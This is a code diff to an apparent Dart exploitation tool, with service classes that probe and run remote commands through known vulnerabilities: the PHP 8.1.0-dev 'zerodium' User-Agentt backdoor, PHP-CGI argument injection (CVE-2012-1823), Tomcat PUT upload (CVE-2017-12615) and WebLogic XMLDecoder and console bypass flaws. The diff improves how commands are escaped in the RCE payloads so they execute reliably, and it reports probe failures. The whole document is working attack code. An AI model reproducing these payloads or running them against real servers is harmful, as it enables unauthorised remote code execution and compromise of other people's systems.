@@ -1,3 +1,4 @@
+import 'dart:convert';
 import 'dart:io';
 
 import '../../../core/http/http_client.dart';
@@ -35,8 +36,10 @@ class PhpBackdoorExpService {
       if ((res.body ?? '').contains('PHP_BACKDOOR_54289')) {
         return ExpResult(true, 'PHP 8.1.0-dev 后门', 'User-Agentt 后门存在，回显验证通过');
       }
-    } catch (_) {}
-    return const ExpResult(false, 'PHP 8.1.0-dev 后门', '');
+    } catch (e) {
+      return ExpResult.probeFailed('PHP 8.1.0-dev 后门', '探测失败: $e');
+    }
+    return ExpResult(false, 'PHP 8.1.0-dev 后门', '');
   }
 
   static const _sentinel = 'PHP_RCE_OUT';
@@ -52,12 +55,14 @@ class PhpBackdoorExpService {
 
   Future<String?> execRce(String cmd) async {
     try {
-      final escaped = cmd.replaceAll('"', r'\"');
+      // PHP 双引号串会插值 $var：必须用单引号字面量，否则 `echo $HOME`
+      // 会被 PHP 当成变量、命令变成 `echo `（实测丢参数）。
+      final escaped = RceEncoder.phpSingleQuoted(cmd);
       final res = await _httpClient.get(
         '$_base$phpPath',
         headers: {
           'User-Agentt':
-              "zerodiumecho '${_sentinel}_S';system(\"$escaped\");echo '${_sentinel}_E';",
+              "zerodiumecho '${_sentinel}_S';system('$escaped');echo '${_sentinel}_E';",
         },
       );
       final body = res.body ?? '';
@@ -105,21 +110,23 @@ class PhpCgiExpService {
           'PHP-CGI 参数注入代码执行验证通过',
         );
       }
-    } catch (_) {}
-    return const ExpResult(false, 'CVE-2012-1823 (PHP-CGI)', '');
+    } catch (e) {
+      return ExpResult.probeFailed('CVE-2012-1823 (PHP-CGI)', '探测失败: $e');
+    }
+    return ExpResult(false, 'CVE-2012-1823 (PHP-CGI)', '');
   }
 
   Future<String?> execRce(String cmd) async {
     try {
       final url =
           '$_base$phpPath?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input';
-      final escaped = RceEncoder.escapeDoubleQuoted(cmd);
+      final escaped = RceEncoder.phpSingleQuoted(cmd);
       const begin = 'MATRIX_CGI_BEGIN';
       const end = 'MATRIX_CGI_END';
       final res = await _httpClient.post(
         url,
         headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-        body: '<?php echo "$begin"; echo shell_exec("$escaped"); echo "$end"; ?>',
+        body: "<?php echo '$begin'; echo shell_exec('$escaped'); echo '$end'; ?>",
       );
       final body = res.body ?? '';
       final s = body.indexOf(begin);
@@ -194,8 +201,10 @@ class TomcatExpService {
           'PUT 方法开启 (状态 ${putRes.statusCode})',
         );
       }
-    } catch (_) {}
-    return const ExpResult(false, 'CVE-2017-12615', '');
+    } catch (e) {
+      return ExpResult.probeFailed('CVE-2017-12615', '探测失败: $e');
+    }
+    return ExpResult(false, 'CVE-2017-12615', '');
   }
 
   Future<String?> getShell() async {
@@ -340,6 +349,8 @@ class WebLogicExpService {
   }
 
   Future<ExpResult> checkCve201710271() async {
+    Object? lastError;
+    var anyResponse = false;
     for (final path in _xmlDecoderProbePaths) {
       try {
         final res = await _httpClient.post(
@@ -350,6 +361,7 @@ class WebLogicExpService {
           },
           body: _xmlDecoderPayload('id'),
         );
+        anyResponse = true;
         if (_looksLikeXmlDecoderEndpointResponse(res)) {
           final code = res.statusCode ?? 0;
           return ExpResult(
@@ -358,9 +370,13 @@ class WebLogicExpService {
             'WebLogic XMLDecoder 端点存在 ($path, HTTP $code)',
           );
         }
-      } catch (_) {
-        // Continue probing other known WSAT endpoints.
+      } catch (e) {
+        // 继续探测其它已知 WSAT 端点，但记录最后一次异常。
+        lastError = e;
       }
+    }
+    if (!anyResponse && lastError != null) {
+      return ExpResult.probeFailed('CVE-2017-10271', '探测失败: $lastError');
     }
     return const ExpResult(false, 'CVE-2017-10271', '');
   }
@@ -391,7 +407,8 @@ class WebLogicExpService {
       req.followRedirects = false;
       final res = await req.close().timeout(timeout);
       final location = (res.headers.value('location') ?? '').toLowerCase();
-      final body = await res.transform(SystemEncoding().decoder).join();
+      final bytes = await res.fold<List<int>>(<int>[], (a, b) => a..addAll(b));
+      final body = utf8.decode(bytes, allowMalformed: true);
       final bodyLower = body.toLowerCase();
 
       final isRedirect = res.statusCode >= 300 && res.statusCode < 400;
@@ -412,7 +429,8 @@ class WebLogicExpService {
               : '控制台路径绕过成功，HTTP 200 命中控制台特征',
         );
       }
-    } catch (_) {
+    } catch (e) {
+      return ExpResult.probeFailed('CVE-2020-14882/14883', '探测失败: $e');
     } finally {
       client.close();
     }
